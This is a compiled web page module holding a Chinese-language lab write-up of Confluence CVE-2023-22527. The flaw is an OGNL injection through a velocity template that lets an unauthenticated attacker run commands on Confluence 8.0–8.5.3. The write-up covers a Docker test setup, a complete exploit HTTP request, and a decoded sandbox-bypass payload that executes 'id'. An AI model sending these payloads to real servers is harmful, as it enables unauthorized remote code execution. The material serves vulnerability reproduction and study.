import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as s,c as r,a as e,b as n,d as a,e as i}from"./app-58e4a7d6.js";const c={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=e("p",null,"Atlassian Confluence 是企业广泛使用的 wiki 系统。",-1),p=e("p",null,"在 Confluence 8.0 到 8.5.3 版本之间，存在一处由于任意 velocity 模板被调用导致的 OGNL 表达式注入漏洞，未授权攻击者利用该漏洞可以直接攻击 Confluence 服务器并执行任意命令。",-1),h=e("p",null,"参考链接：",-1),v={href:"https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html",target:"_blank",rel:"noopener noreferrer"},m={href:"https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/",target:"_blank",rel:"noopener noreferrer"},_=i(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 Confluence Server 8.5.3：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,3),b=e("code",null,"http://your-vps-ip:8090",-1),f={href:"https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396",target:"_blank",rel:"noopener noreferrer"},g=i(`<p>在填写数据库信息的页面，PostgreSQL 数据库地址为 <code>db</code>，数据库名称 <code>confluence</code>，用户名密码均为 <code>postgres</code>。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226144953603.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>直接发送如下请求即可执行任意命令，并在 HTTP 返回头中获取执行结果：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /template/aui/text-inline.vm HTTP/1.1
Host: your-vps-ip:8090
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 285

label=\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027&amp;x=@org.apache.struts2.ServletActionContext@getResponse().setHeader(&#39;X-Cmd-Response&#39;,(new freemarker.template.utility.Execute()).exec({&quot;id&quot;}))
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240614134238188.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,6),x=e("code",null,"isSafeExpression",-1),C={href:"https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/",target:"_blank",rel:"noopener noreferrer"},y=e("code",null,"#request['.KEY_velocity.struts2.context'].internalGet('ognl').findValue(String, Object)",-1),k=e("div",{class:"language-text line-numbers-mode","data-ext":"text"},[e("pre",{class:"language-text"},[e("code",null,`'+(#request['.KEY_velocity.struts2.context'].internalGet('ognl').findValue(@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"})),{}))+'
`)]),e("div",{class:"line-numbers","aria-hidden":"true"},[e("div",{class:"line-number"})])],-1);function E(A,V){const t=l("ExternalLinkIcon");return s(),r("div",null,[d,u,p,h,e("ul",null,[e("li",null,[e("a",v,[n("https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html"),a(t)])]),e("li",null,[e("a",m,[n("https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/"),a(t)])])]),_,e("p",null,[n("环境启动后，访问 "),b,n(" 即可进入安装向导。点击“Get an evaluation license”，去 Atlassian 官方申请一个 Confluence Server 的试用版许可证，申请方法可参考 "),e("a",f,[n("CVE-2019-3396"),a(t)]),n("。")]),g,e("p",null,[n("在 Confluence 7.18.0 版本后，官方开发者为其引入了 "),x,n(" 函数来限制执行恶意 OGNL 表达式。安全研究者 "),e("a",C,[n("Alvaro Muñoz"),a(t)]),n(" 分享了一种利用 velocity 模板中的 "),y,n(" 来获取无沙箱的 OGNL 对象并执行任意语句的绕过方法，完整并解码后的 Payload 如下：")]),k])}const G=o(c,[["render",E],["__file","Atlassian Confluence OGNL表达式注入命令执行漏洞 CVE-2023-22527.html.vue"]]);export{G as default};
